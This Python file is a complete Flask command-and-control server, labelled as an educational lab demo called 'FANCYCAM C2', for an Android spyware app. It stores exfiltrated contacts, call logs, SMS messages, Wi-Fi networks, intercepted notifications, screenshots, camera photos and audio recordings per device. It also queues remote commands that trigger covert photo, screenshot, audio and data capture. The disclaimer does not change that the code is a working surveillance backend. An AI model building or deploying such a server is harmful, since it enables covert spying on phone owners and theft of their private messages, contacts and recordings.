#!/usr/bin/env python3
"""
EDUCATIONAL DEMO - Android Security & Forensics Course
Flask C2 Server with Web UI for controlled lab environment.

This server receives exfiltrated data from the Android demo app,
organizes it for forensic analysis, and provides a real-time
dashboard for monitoring.

Data is stored under a per-device folder keyed by the device's
android_id, so assets from different devices never mix:

    exfiltrated_data/
      <android_id>/
        json_data/     -> device_data_*.json
        screenshots/   -> capture_*.png/jpg
        audio/         -> audio_*.m4a

FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.

Usage:
    pip install flask
    python flask_c2_server.py

Endpoints:
    GET  /               - Web UI Dashboard
    GET  /api/status     - JSON API: collection statistics
    GET  /api/payloads   - JSON API: list all received payloads
    GET  /api/payload/<path> - JSON API: get specific payload
    POST /exfil/json     - Receive device data JSON
    POST /exfil/screenshot - Receive screenshot images
    POST /exfil/audio    - Receive audio recordings
"""

from flask import Flask, request, jsonify, send_from_directory, render_template
import os
import re
import json
import time
import shutil
import uuid
from datetime import datetime

app = Flask(__name__)

# Storage root. Per-device data lives in DATA_DIR/<android_id>/<type>/.
DATA_DIR = 'exfiltrated_data'

# Legacy flat directories kept only for one-time migration of older data.
LEGACY_JSON_DIR = os.path.join(DATA_DIR, 'json_data')
LEGACY_SCREENSHOT_DIR = os.path.join(DATA_DIR, 'screenshots')
LEGACY_AUDIO_DIR = os.path.join(DATA_DIR, 'audio')

os.makedirs(DATA_DIR, exist_ok=True)


def safe_device_id(raw):
    """Return a filesystem-safe device folder name for an android_id."""
    if raw is None:
        return 'unknown'
    value = str(raw).strip()
    if not value:
        return 'unknown'
    value = re.sub(r'[^A-Za-z0-9_.-]', '_', value)
    value = value.strip('._')
    return value or 'unknown'


def device_type_dir(aid, type_name):
    """Ensure and return DATA_DIR/<aid>/<type_name>."""
    path = os.path.join(DATA_DIR, safe_device_id(aid), type_name)
    os.makedirs(path, exist_ok=True)
    return path


def relative_to_data(path):
    return os.path.relpath(path, DATA_DIR).replace(os.sep, '/')


def extract_android_id_from_json(path):
    try:
        with open(path, 'r', encoding='utf-8') as jf:
            data = json.load(jf)
        dev_info = data.get('device_info', {}) or {}
        return dev_info.get('android_id') or data.get('android_id')
    except Exception:
        return None


def migrate_legacy_file(src_path, type_name, aid):
    target_dir = device_type_dir(aid, type_name)
    target_path = os.path.join(target_dir, os.path.basename(src_path))
    if os.path.abspath(src_path) == os.path.abspath(target_path):
        return
    if os.path.exists(target_path):
        return
    try:
        shutil.move(src_path, target_path)
    except Exception:
        pass


def migrate_legacy_data():
    """Move old flat-collected files into per-device folders once."""
    # JSON: attribute each payload to its android_id.
    if os.path.isdir(LEGACY_JSON_DIR):
        for name in os.listdir(LEGACY_JSON_DIR):
            src = os.path.join(LEGACY_JSON_DIR, name)
            if not os.path.isfile(src):
                continue
            aid = extract_android_id_from_json(src) or 'unknown'
            migrate_legacy_file(src, 'json_data', aid)

    # Screenshots/audio have no device metadata on disk: keep under 'unknown'.
    for type_name, legacy_dir in (('screenshots', LEGACY_SCREENSHOT_DIR),
                                 ('audio', LEGACY_AUDIO_DIR)):
        if os.path.isdir(legacy_dir):
            for name in os.listdir(legacy_dir):
                src = os.path.join(legacy_dir, name)
                if os.path.isfile(src):
                    migrate_legacy_file(src, type_name, 'unknown')


migrate_legacy_data()

# In-memory tracking of device network heartbeats / check-ins
device_checkins = {}  # android_id -> dict with last_seen_epoch, model, brand, etc.
ONLINE_THRESHOLD_SECONDS = 60

# In-memory C2 command queue and history for remote control
pending_commands = []
command_history = []


def queue_command(action, target='all', params=None):
    """Queue a new command with a unique ID and record in history."""
    cmd_id = f"cmd_{int(time.time()*1000)}_{uuid.uuid4().hex[:6]}"
    cmd = {
        'id': cmd_id,
        'command_id': cmd_id,
        'action': action,
        'target': target,
        'params': params or {},
        'status': 'queued',
        'created_at': datetime.now().isoformat()
    }
    pending_commands.append(cmd)
    command_history.insert(0, cmd)
    if len(command_history) > 100:
        command_history.pop()
    return cmd


def pop_pending_commands(aid=None):
    global pending_commands
    matched = []
    remaining = []
    now_iso = datetime.now().isoformat()
    for cmd in pending_commands:
        target = cmd.get('target', 'all')
        if target == 'all' or not aid or target == aid:
            cmd['status'] = 'dispatched'
            cmd['dispatched_at'] = now_iso
            cmd['dispatched_to'] = aid or 'unknown'
            matched.append(cmd)
        else:
            remaining.append(cmd)
    pending_commands = remaining
    return matched


# In-memory event log for real-time dashboard
event_log = []
MAX_EVENTS = 100


def log_event(event_type, message, details=None):
    """Add an event to the in-memory log for the dashboard."""
    event = {
        'timestamp': datetime.now().isoformat(),
        'type': event_type,
        'message': message,
        'details': details or {}
    }
    event_log.insert(0, event)
    if len(event_log) > MAX_EVENTS:
        event_log.pop()


def resolve_data_path(filename):
    """Resolve a relative data path safely, returning an absolute path or None."""
    if not filename:
        return None
    cleaned = str(filename).replace('\\', '/')
    target = os.path.abspath(os.path.join(DATA_DIR, cleaned))
    base = os.path.abspath(DATA_DIR)
    if target != base and not target.startswith(base + os.sep):
        return None
    return target


def count_type_files(type_name, device_id=None):
    total = 0
    for root, _dirs, files in os.walk(DATA_DIR):
        if os.path.basename(root) != type_name:
            continue
        parent_device = os.path.basename(os.path.dirname(root))
        rel_root = os.path.relpath(root, DATA_DIR).replace(os.sep, '/')
        parts = rel_root.split('/')
        if len(parts) <= 1:
            parent_device = 'unknown'
        if device_id and device_id not in ('all', 'null', 'None', ''):
            if parent_device != device_id:
                continue
        total += len(files)
    return total


def list_type_files(type_name, device_id=None):
    """Return relative (to DATA_DIR) file paths for one data type, newest first."""
    results = []
    for root, _dirs, files in os.walk(DATA_DIR):
        if os.path.basename(root) != type_name:
            continue
        rel_root = os.path.relpath(root, DATA_DIR).replace(os.sep, '/')
        parts = rel_root.split('/')
        parent_dev = parts[0] if len(parts) > 1 and parts[0] != type_name else 'unknown'
        if device_id and device_id != 'all' and parent_dev != device_id:
            continue
        for fn in files:
            full = os.path.join(root, fn)
            results.append((os.path.getmtime(full), os.path.relpath(full, DATA_DIR).replace(os.sep, '/')))
    results.sort(key=lambda x: x[0], reverse=True)
    return [r[1] for r in results]


def list_type_files_detailed(type_name, device_id=None):
    """Return detailed metadata for files of a given type, newest first."""
    results = []
    for root, _dirs, files in os.walk(DATA_DIR):
        if os.path.basename(root) != type_name:
            continue
        rel_root = os.path.relpath(root, DATA_DIR).replace(os.sep, '/')
        parts = rel_root.split('/')
        parent_dev = parts[0] if len(parts) > 1 and parts[0] != type_name else 'unknown'
        if device_id and device_id != 'all' and parent_dev != device_id:
            continue
        for fn in files:
            full = os.path.join(root, fn)
            try:
                mtime = os.path.getmtime(full)
                size = os.path.getsize(full)
                rel_path = os.path.relpath(full, DATA_DIR).replace(os.sep, '/')
                est_seconds = round(size / 16000.0, 1)
                size_str = f"{size / 1024:.1f} KB" if size < 1024 * 1024 else f"{size / (1024 * 1024):.2f} MB"
                results.append({
                    'path': rel_path,
                    'filename': fn,
                    'device_id': parent_dev,
                    'size': size,
                    'size_str': size_str,
                    'timestamp': int(mtime * 1000),
                    'formatted_time': datetime.fromtimestamp(mtime).strftime("%Y-%m-%d %H:%M:%S"),
                    'duration_est': f"{est_seconds}s"
                })
            except Exception:
                continue
    results.sort(key=lambda x: x['timestamp'], reverse=True)
    return results


def list_json_files_sorted():
    files = []
    for root, _dirs, fs in os.walk(DATA_DIR):
        if os.path.basename(root) != 'json_data':
            continue
        for fn in fs:
            if fn.endswith('.json'):
                files.append(os.path.join(root, fn))
    files.sort(key=lambda p: os.path.getmtime(p), reverse=True)
    return files


# =========================================================================
# API Routes
# =========================================================================

@app.route('/')
def dashboard():
    """Serve the main dashboard web UI."""
    return render_template('dashboard.html')


@app.route('/health')
def health():
    """Health check endpoint returning health status."""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/status')
def api_status():
    """Return collection statistics as JSON.

    Optional `device` query parameter scopes the per-type counters to a single
    device's directory. This keeps the dashboard's tab counts consistent with
    the device/data that is actually shown.
    """
    target_device = request.args.get('device')
    json_count = count_type_files('json_data', target_device)
    img_count = count_type_files('screenshots', target_device)
    photo_count = count_type_files('photos', target_device)
    audio_count = count_type_files('audio', target_device)
    devs = api_devices().json or []
    online_count = sum(1 for d in devs if d.get('is_online'))
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'device_id': target_device,
        'json_received': json_count,
        'screenshots_received': img_count,
        'photos_received': photo_count,
        'audio_received': audio_count,
        'event_count': len(event_log),
        'storage_path': os.path.abspath(DATA_DIR),
        'devices_total': len(devs),
        'devices_online': online_count
    })


@app.route('/api/events')
def api_events():
    """Return recent event log."""
    return jsonify(event_log[:50])


@app.route('/api/commands', methods=['GET'])
def api_commands():
    """Return the pending C2 command queue."""
    return jsonify(pending_commands)


@app.route('/api/commands/history', methods=['GET'])
def api_commands_history():
    """Return the full C2 command history with status tracking."""
    return jsonify(command_history)


@app.route('/api/commands/clear', methods=['POST'])
def api_clear_commands():
    """Clear all pending C2 commands."""
    global pending_commands
    count = len(pending_commands)
    pending_commands = []
    for c in command_history:
        if c.get('status') == 'queued':
            c['status'] = 'cancelled'
    log_event('action', f"Cleared {count} pending commands from queue")
    return jsonify({'status': 'success', 'cleared_count': count})


@app.route('/api/commands/result', methods=['POST'])
def receive_command_result():
    """Receive command execution acknowledgment and result from device."""
    data = request.get_json(silent=True) or {}
    cmd_id = data.get('command_id')
    aid = data.get('android_id') or 'unknown'
    status = data.get('status', 'completed')
    action = data.get('action', '')
    res = data.get('result', {})
    err = data.get('error')
    now_iso = datetime.now().isoformat()

    found = False
    for c in command_history:
        if c.get('id') == cmd_id or c.get('command_id') == cmd_id:
            c['status'] = status
            c['completed_at'] = now_iso
            c['result'] = res
            c['error'] = err
            found = True
            break
    if not found and cmd_id:
        command_history.insert(0, {
            'id': cmd_id,
            'command_id': cmd_id,
            'action': action,
            'target': aid,
            'status': status,
            'completed_at': now_iso,
            'result': res,
            'error': err
        })

    log_event('action', f"Command {action} ({cmd_id}) {status.upper()}", {
        'command_id': cmd_id,
        'android_id': aid,
        'status': status,
        'action': action,
        'result': res,
        'error': err,
        'timestamp': now_iso
    })

    return jsonify({'status': 'success', 'command_id': cmd_id, 'recorded_status': status})


@app.route('/api/heartbeat', methods=['POST', 'GET'])
def receive_heartbeat():
    """Receive heartbeat ping from active device over the network."""
    data = request.get_json(silent=True) or {}
    poll_commands = request.args.get('poll_commands') != '0'
    aid = data.get('android_id') or request.args.get('android_id') or request.headers.get('X-Android-ID')
    if aid:
        device_checkins[aid] = {
            'last_seen_epoch': time.time(),
            'last_seen': data.get('timestamp') or datetime.now().isoformat(),
            'model': data.get('model'),
            'brand': data.get('brand'),
            'manufacturer': data.get('manufacturer'),
            'release': data.get('release'),
            'sdk_version': data.get('sdk_version')
        }
        cmds = pop_pending_commands(aid) if poll_commands else []
        return jsonify({
            'status': 'success',
            'device_status': 'online',
            'android_id': aid,
            'commands': cmds,
            'timestamp': datetime.now().isoformat()
        })
    cmds = pop_pending_commands(None) if poll_commands else []
    return jsonify({'status': 'success', 'commands': cmds, 'message': 'missing android_id'})


@app.route('/api/devices')
def api_devices():
    """List distinct devices identified from network communication and received payloads."""
    devices = {}
    now_epoch = time.time()

    for filepath in list_json_files_sorted():
        file_mtime = os.path.getmtime(filepath)
        try:
            with open(filepath, 'r', encoding='utf-8') as jf:
                data = json.load(jf)
            dev_info = data.get('device_info', {}) or {}
            aid = dev_info.get('android_id') or data.get('android_id')
            if not aid:
                continue
            rel = relative_to_data(filepath)
            if aid not in devices:
                checkin_info = device_checkins.get(aid, {})
                last_seen_epoch = checkin_info.get('last_seen_epoch', file_mtime)
                is_online = (now_epoch - last_seen_epoch) < ONLINE_THRESHOLD_SECONDS
                devices[aid] = {
                    'android_id': aid,
                    'model': checkin_info.get('model') or dev_info.get('model') or data.get('model', 'Android Target'),
                    'brand': checkin_info.get('brand') or dev_info.get('brand') or data.get('brand', 'Android'),
                    'manufacturer': checkin_info.get('manufacturer') or dev_info.get('manufacturer', ''),
                    'release': checkin_info.get('release') or dev_info.get('release', ''),
                    'sdk_version': checkin_info.get('sdk_version') or dev_info.get('sdk_version', ''),
                    'last_seen': checkin_info.get('last_seen') or dev_info.get('timestamp') or data.get('timestamp') or datetime.fromtimestamp(last_seen_epoch).isoformat(),
                    'last_seen_epoch': last_seen_epoch,
                    'is_online': is_online,
                    'status': 'online' if is_online else 'offline',
                    'latest_file': rel,
                    'payload_count': 1
                }
            else:
                devices[aid]['payload_count'] += 1
        except Exception:
            pass

    # Include live devices that connected over network but haven't written payloads to disk
    for aid, checkin_info in device_checkins.items():
        if aid not in devices:
            last_seen_epoch = checkin_info.get('last_seen_epoch', 0)
            is_online = (now_epoch - last_seen_epoch) < ONLINE_THRESHOLD_SECONDS
            devices[aid] = {
                'android_id': aid,
                'model': checkin_info.get('model', 'Android Target'),
                'brand': checkin_info.get('brand', 'Android'),
                'manufacturer': checkin_info.get('manufacturer', ''),
                'release': checkin_info.get('release', ''),
                'sdk_version': checkin_info.get('sdk_version', ''),
                'last_seen': checkin_info.get('last_seen') or datetime.fromtimestamp(last_seen_epoch).isoformat(),
                'last_seen_epoch': last_seen_epoch,
                'is_online': is_online,
                'status': 'online' if is_online else 'offline',
                'latest_file': None,
                'payload_count': 0
            }

    return jsonify(list(devices.values()))


@app.route('/api/latest')
def api_latest():
    """Return the most recently received JSON payload, optionally for a specific device."""
    target_device = request.args.get('device')
    files = list_json_files_sorted()
    if not files:
        return jsonify({'payload': None})

    for filepath in files:
        try:
            with open(filepath, 'r', encoding='utf-8') as jf:
                data = json.load(jf)
            if target_device:
                dev_info = data.get('device_info', {}) or {}
                aid = dev_info.get('android_id') or data.get('android_id')
                if aid != target_device:
                    continue
            rel = relative_to_data(filepath)
            return jsonify({
                'payload': data,
                'filename': rel,
                'file_count': len(files),
                'timestamp': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
            })
        except Exception:
            continue

    return jsonify({'payload': None})


@app.route('/api/payloads')
def api_payloads_list():
    """List received JSON payloads with metadata, optionally filtered by device."""
    target_device = request.args.get('device')
    files = list_json_files_sorted()
    result = []
    for filepath in files:
        try:
            if target_device:
                with open(filepath, 'r', encoding='utf-8') as jf:
                    data = json.load(jf)
                dev_info = data.get('device_info', {}) or {}
                aid = dev_info.get('android_id') or data.get('android_id')
                if aid != target_device:
                    continue
            rel = relative_to_data(filepath)
            result.append({
                'filename': rel,
                'size': os.path.getsize(filepath),
                'timestamp': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
            })
        except Exception:
            continue
    return jsonify(result)


@app.route('/api/payload/<path:filename>')
def api_payload_get(filename):
    """Get a specific JSON payload by filename."""
    filepath = resolve_data_path(filename)
    if not filepath or not os.path.isfile(filepath):
        return jsonify({'error': 'Not found'}), 404
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify({
            'payload': data,
            'filename': relative_to_data(filepath),
            'timestamp': datetime.fromtimestamp(os.path.getmtime(filepath)).isoformat()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/notifications')
def api_notifications_list():
    """List intercepted notifications, optionally filtered by device."""
    target_device = request.args.get('device')
    files = list_json_files_sorted()
    all_notifs = []
    seen = set()

    for filepath in files:
        try:
            with open(filepath, 'r', encoding='utf-8') as jf:
                data = json.load(jf)
            if target_device:
                dev_info = data.get('device_info', {}) or {}
                aid = dev_info.get('android_id') or data.get('android_id')
                if aid != target_device:
                    continue
            notifs = data.get('notifications', [])
            single = data.get('notification_event')
            combined = list(notifs)
            if single and isinstance(single, dict):
                combined.append(single)

            for n in combined:
                if not isinstance(n, dict):
                    continue
                key = (n.get('package'), n.get('title'), n.get('text'), n.get('timestamp'))
                if key not in seen:
                    seen.add(key)
                    all_notifs.append(n)
        except Exception:
            continue

    all_notifs.sort(key=lambda n: int(n.get('timestamp') or 0), reverse=True)
    return jsonify(all_notifs)


@app.route('/api/audio')
def api_audio_list():
    """List audio files with optional device filtering and metadata."""
    target_device = request.args.get('device')
    detailed = list_type_files_detailed('audio', target_device)
    if request.args.get('format') == 'simple' or request.args.get('legacy') == '1':
        return jsonify([item['path'] for item in detailed])
    return jsonify(detailed)


@app.route('/api/audio/file/<path:filename>')
def api_audio_file(filename):
    """Serve an audio file with proper audio/mp4 MIME type and optional attachment download."""
    filepath = resolve_data_path(filename)
    if not filepath or not os.path.isfile(filepath):
        return jsonify({'error': 'Not found'}), 404
    as_att = request.args.get('download') == '1'
    return send_from_directory(
        os.path.dirname(filepath),
        os.path.basename(filepath),
        mimetype='audio/mp4',
        as_attachment=as_att,
        download_name=os.path.basename(filepath)
    )


@app.route('/api/screenshots')
def api_screenshot_list():
    """List screenshot files."""
    target_device = request.args.get('device')
    return jsonify(list_type_files('screenshots', target_device))


@app.route('/api/screenshot/file/<path:filename>')
def api_screenshot_file(filename):
    """Serve a screenshot file."""
    filepath = resolve_data_path(filename)
    if not filepath or not os.path.isfile(filepath):
        return jsonify({'error': 'Not found'}), 404
    return send_from_directory(os.path.dirname(filepath), os.path.basename(filepath))



@app.route('/api/photos')
def api_photo_list():
    """List photo files."""
    target_device = request.args.get('device')
    return jsonify(list_type_files('photos', target_device))


@app.route('/api/photo/file/<path:filename>')
def api_photo_file(filename):
    """Serve a photo file."""
    filepath = resolve_data_path(filename)
    if not filepath or not os.path.isfile(filepath):
        return jsonify({'error': 'Not found'}), 404
    return send_from_directory(os.path.dirname(filepath), os.path.basename(filepath))



@app.route('/api/trigger/screenshot', methods=['POST'])
def api_trigger_screenshot():
    """Manually trigger a screenshot/photo capture command from the Android app."""
    data = request.get_json(silent=True) or {}
    target = data.get('target') or request.args.get('target') or 'all'
    cmd = queue_command('take_screenshot', target=target)
    log_event('action', f"Screenshot command queued ({cmd['id']}) for client", {
        'timestamp': datetime.now().isoformat(),
        'action_type': 'manual_screenshot',
        'command_id': cmd['id'],
        'status': 'queued',
        'target': target
    })

    return jsonify({
        'status': 'success',
        'command_id': cmd['id'],
        'message': 'Screenshot capture command queued',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/trigger/photo', methods=['POST'])
@app.route('/api/trigger/camera', methods=['POST'])
def api_trigger_photo():
    """Manually trigger a camera photo capture command from the Android app."""
    data = request.get_json(silent=True) or {}
    target = data.get('target') or request.args.get('target') or 'all'
    cmd = queue_command('take_photo', target=target)
    log_event('action', f"Camera photo capture command queued ({cmd['id']}) for client", {
        'timestamp': datetime.now().isoformat(),
        'action_type': 'manual_photo',
        'command_id': cmd['id'],
        'status': 'queued',
        'target': target
    })

    return jsonify({
        'status': 'success',
        'command_id': cmd['id'],
        'message': 'Camera photo capture command queued',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/trigger/audio', methods=['POST'])
def api_trigger_audio():
    """Manually trigger audio recording command from the Android app."""
    data = request.get_json(silent=True) or {}
    target = data.get('target') or request.args.get('target') or 'all'
    cmd = queue_command('record_audio', target=target, params={'duration': 30000})
    log_event('action', f"Audio recording command queued ({cmd['id']}) for client", {
        'timestamp': datetime.now().isoformat(),
        'action_type': 'manual_audio',
        'command_id': cmd['id'],
        'status': 'queued',
        'duration': '30 seconds',
        'target': target
    })

    return jsonify({
        'status': 'success',
        'command_id': cmd['id'],
        'message': 'Audio recording command queued (30 seconds)',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/trigger/collect', methods=['POST'])
@app.route('/api/trigger/data', methods=['POST'])
def api_trigger_collect():
    """Manually trigger on-demand comprehensive data collection from device."""
    data = request.get_json(silent=True) or {}
    target = data.get('target') or request.args.get('target') or 'all'
    cmd = queue_command('collect_data', target=target)
    log_event('action', f"On-demand data collection command queued ({cmd['id']}) for client", {
        'timestamp': datetime.now().isoformat(),
        'action_type': 'collect_data',
        'command_id': cmd['id'],
        'status': 'queued',
        'target': target
    })

    return jsonify({
        'status': 'success',
        'command_id': cmd['id'],
        'message': 'Data collection command queued',
        'timestamp': datetime.now().isoformat()
    })


# =========================================================================
# Exfiltration Endpoints
# =========================================================================

@app.route('/exfil/json', methods=['POST'])
def receive_json():
    """Receive and store device data JSON payload."""
    data = request.get_json(silent=True)
    if not data:
        log_event('error', 'Invalid JSON payload received')
        return jsonify({'status': 'error', 'message': 'Missing JSON body'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    device = data.get('device_info', {}) or {}
    aid = device.get('android_id') or data.get('android_id') or 'unknown'
    target_dir = device_type_dir(aid, 'json_data')
    filename = f"device_data_{ts}.json"
    path = os.path.join(target_dir, filename)

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    if aid and aid != 'unknown':
        device_checkins[aid] = {
            'last_seen_epoch': time.time(),
            'last_seen': device.get('timestamp') or data.get('timestamp') or datetime.now().isoformat(),
            'model': device.get('model') or data.get('model'),
            'brand': device.get('brand') or data.get('brand'),
            'manufacturer': device.get('manufacturer') or data.get('manufacturer'),
            'release': device.get('release') or data.get('release'),
            'sdk_version': device.get('sdk_version') or data.get('sdk_version')
        }

    contacts = data.get('contacts', [])
    call_logs = data.get('call_logs', [])
    sms = data.get('sms_messages', [])
    wifi = data.get('wifi_networks', {})
    notifications = data.get('notifications', [])

    msg = (f"Device: {device.get('brand', '?')} {device.get('model', '?')} | "
           f"Contacts: {len(contacts)} | Calls: {len(call_logs)} | "
           f"SMS: {len(sms)} | WiFi: {len(wifi.get('networks', []))} | "
           f"Notifications: {len(notifications)}")

    rel = relative_to_data(path)
    log_event('json', f'Payload received: {rel}', {
        'brand': device.get('brand', ''),
        'model': device.get('model', ''),
        'android_id': device.get('android_id', ''),
        'contacts_count': len(contacts),
        'call_logs_count': len(call_logs),
        'sms_count': len(sms),
        'wifi_count': len(wifi.get('networks', [])),
        'notifications_count': len(notifications),
        'filename': rel
    })

    print(f"[{datetime.now()}] EXFILTRATED JSON -> {path}")
    print(f"  {msg}")

    cmds = pop_pending_commands(aid if aid != 'unknown' else None)
    return jsonify({
        'status': 'success',
        'message': 'Data received',
        'filename': rel,
        'commands': cmds,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/exfil/screenshot', methods=['POST'])
def receive_screenshot():
    """Receive and store screenshot images or captured photos."""
    file = (request.files.get('screenshot') or
            request.files.get('image') or
            request.files.get('file'))
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    aid = request.form.get('android_id') or request.args.get('android_id') or request.headers.get('X-Android-ID') or 'unknown'
    if aid != 'unknown':
        if aid in device_checkins and isinstance(device_checkins[aid], dict):
            device_checkins[aid]['last_seen_epoch'] = time.time()
            device_checkins[aid]['last_seen'] = datetime.now().isoformat()
        else:
            device_checkins[aid] = {
                'last_seen_epoch': time.time(),
                'last_seen': datetime.now().isoformat()
            }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    ext = os.path.splitext(file.filename)[1] or '.png'
    filename = f"screenshot_{ts}{ext}"
    target_dir = device_type_dir(aid, 'screenshots')
    path = os.path.join(target_dir, filename)
    file.save(path)
    size = os.path.getsize(path)

    rel = relative_to_data(path)
    log_event('screenshot', f'Screenshot saved: {rel} ({size / 1024:.1f} KB)')
    print(f"[{datetime.now()}] EXFILTRATED SCREENSHOT -> {path} ({size / 1024:.1f} KB)")

    return jsonify({
        'status': 'success',
        'filename': rel,
        'file_size': size,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/exfil/photo', methods=['POST'])
def receive_photo():
    """Receive and store camera photos captured by the device."""
    file = (request.files.get('photo') or
            request.files.get('image') or
            request.files.get('file'))
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    aid = request.form.get('android_id') or request.args.get('android_id') or request.headers.get('X-Android-ID') or 'unknown'
    if aid != 'unknown':
        if aid in device_checkins and isinstance(device_checkins[aid], dict):
            device_checkins[aid]['last_seen_epoch'] = time.time()
            device_checkins[aid]['last_seen'] = datetime.now().isoformat()
        else:
            device_checkins[aid] = {
                'last_seen_epoch': time.time(),
                'last_seen': datetime.now().isoformat()
            }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    ext = os.path.splitext(file.filename)[1] or '.jpg'
    filename = f"photo_{ts}{ext}"
    target_dir = device_type_dir(aid, 'photos')
    path = os.path.join(target_dir, filename)
    file.save(path)
    size = os.path.getsize(path)

    rel = relative_to_data(path)
    log_event('photo', f'Photo saved: {rel} ({size / 1024:.1f} KB)')
    print(f"[{datetime.now()}] EXFILTRATED PHOTO -> {path} ({size / 1024:.1f} KB)")

    return jsonify({
        'status': 'success',
        'filename': rel,
        'file_size': size,
        'timestamp': datetime.now().isoformat()
    })



@app.route('/exfil/audio', methods=['POST'])
def receive_audio():
    """Receive and store audio recordings."""
    file = request.files.get('audio')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    aid = request.form.get('android_id') or request.args.get('android_id') or request.headers.get('X-Android-ID') or 'unknown'
    if aid != 'unknown':
        if aid in device_checkins and isinstance(device_checkins[aid], dict):
            device_checkins[aid]['last_seen_epoch'] = time.time()
            device_checkins[aid]['last_seen'] = datetime.now().isoformat()
        else:
            device_checkins[aid] = {
                'last_seen_epoch': time.time(),
                'last_seen': datetime.now().isoformat()
            }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"audio_{ts}.m4a"
    target_dir = device_type_dir(aid, 'audio')
    path = os.path.join(target_dir, filename)
    file.save(path)
    size = os.path.getsize(path)

    estimated_seconds = size / 16000

    rel = relative_to_data(path)
    log_event('audio', f'Audio saved: {rel} ({size / 1024:.1f} KB, ~{estimated_seconds:.1f}s)')
    print(f"[{datetime.now()}] EXFILTRATED AUDIO -> {path} ({size / 1024:.1f} KB, ~{estimated_seconds:.1f}s)")

    return jsonify({
        'status': 'success',
        'filename': rel,
        'file_size': size,
        'estimated_duration': f"{estimated_seconds:.1f}s",
        'timestamp': datetime.now().isoformat()
    })


# =========================================================================
# Main
# =========================================================================

if __name__ == '__main__':
    print("=" * 60)
    print("  FANCYCAM C2 SERVER - EDUCATIONAL DASHBOARD")
    print("  For sandboxed lab environments only")
    print("=" * 60)
    print(f"  Dashboard:  http://localhost:5000")
    print(f"  Storage:    {os.path.abspath(DATA_DIR)}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
